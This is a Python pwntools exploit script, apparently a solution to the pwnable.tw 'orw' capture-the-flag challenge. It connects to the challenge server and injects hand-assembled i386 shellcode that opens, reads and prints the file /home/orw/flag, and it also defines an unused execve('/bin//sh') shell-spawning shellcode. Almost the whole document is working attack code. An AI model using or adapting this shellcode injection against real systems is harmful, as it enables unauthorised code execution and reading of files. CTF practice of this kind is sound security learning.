#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

# Interface
local = False
os_level = 32
binary_name = 'orw'
remote_addr = 'chall.pwnable.tw'
port = 10001

if local:
	p = process("./" + binary_name)
	e = ELF("./" + binary_name)
	# libc = e.libc
else:
	p = remote(remote_addr, port)
	e = ELF("./" + binary_name)
	# libc = ELF("libc-2.23.so")

if os_level == 64:
	context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
	context(log_level='debug', os='linux', arch='i386', bits=32)
else:
	print('Error os!!!')
	exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

def z(a=''):
	if local:
		gdb.attach(p, a)
		if a == '':
			raw_input()
	else:
		pass


ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sla = lambda delim, data: p.sendlineafter(delim, data) 
sa = lambda delim, data: p.sendafter(delim,data)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)

shellcode=asm( 
    """ 
		xor ecx,ecx;
        xor edx,edx ; 
        push edx;
        push 0x68732f6e;
        push 0x69622f2f; 
        mov ebx,esp;
        mov eax,0xb;
        int 0x80 
	"""
)

# Main
if __name__ == "__main__":
	""" 
	shell = shellcraft.open('home/orw/flag')
	shell += shellcraft.read('eax','esp',100)
	shell += shellcraft.write(1,'esp',100)
	shell = asm(shell)
	"""
    
	#sys_open('home/orw/flag')
	shell = asm(
		'''
		push 0x00000067
		push 0x616c662f
		push 0x77726f2f
		push 0x656d6f68
		mov ebx,esp
		xor ecx,ecx
		xor edx,edx
		mov eax,0x05
		int 0x80
        '''
		)
	#sys_read(3,file,0x26)
	shell += asm(
		"""
        mov eax,0x03
		mov ecx,ebx
		mov ebx,0x03
		mov edx,0x26
		int 0x80
        """
    )
	#sys_write(1,file,0x26)
	shell += asm(
		'''
        mov eax,0x04
		mov ebx,0x01
		int 0x80
        '''
    )
	p.send(shell)
	p.interactive()